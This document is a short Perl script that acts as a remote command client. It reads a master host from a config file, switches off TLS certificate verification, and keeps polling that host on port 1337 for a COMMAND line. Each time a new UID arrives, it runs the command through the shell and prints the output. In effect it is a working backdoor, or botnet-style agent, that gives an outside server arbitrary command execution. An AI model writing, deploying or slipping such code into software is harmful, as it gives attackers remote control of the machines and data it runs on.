use strict;
use warnings;
use LWP::UserAgent ();
use Data::Dumper;
my $master = qx(cat ./client.conf);
chomp $master;
$|=1;


my $ua = LWP::UserAgent->new();
$ua->ssl_opts(verify_hostname => 0,SSL_verify_mode => 0x00);


my $last_UID = "none";

while (1) {
my $request = $ua->get("https://$master:1337/");
die "couldnt retrieve commands" unless defined $request;

my $command = $request->{_content};
my $UID = $request->{_content};

$command =~ /COMMAND: (.*)/;
$command = $1;

$UID =~ /UID: (.*)/;
$UID = $1;




if (defined $command) {
    if ($UID ne $last_UID) {
    my $exec = qx($command);
    print "$exec\n";
    #print "waiting for command\n";
    sleep 3;
    $last_UID = $UID;
    }  else {
            sleep 1;
    }
  } else {
          print "command not defined, waiting for input\n";
    sleep 1;
  }

}
